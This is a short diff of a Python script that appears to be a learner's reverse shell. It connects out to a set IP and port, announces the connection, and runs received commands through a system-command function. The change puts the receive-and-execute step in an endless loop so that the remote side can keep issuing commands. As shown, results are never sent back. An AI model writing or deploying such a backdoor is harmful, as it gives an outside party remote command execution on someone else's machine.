@@ -25,17 +25,16 @@ connection = socket.socket(socket.AF_INET,  socket.SOCK_STREAM) #create instance
 connection.connect((ip, port)) #connect method from connection variable
 connection.send("\n++Connection established++\n") #python3 requires bytes-like object to be passed, not string
 
-command = connection.recv(buffer_size) #receive, specify buffer size
-#print(received_data)
-command_result = execute_system_command(command)
+while True:
+    command = connection.recv(buffer_size) #receive, specify buffer size
+    #print(received_data)
+    command_result = execute_system_command(command)
 connection.close()
 #connect method takes a tuple
 #takes IP and port arguments
 #create socket connection from host to target IP and port
 
-
-
-
+############################################################################
 ###Commented code below###
 #!/usr/bin/env python3
 
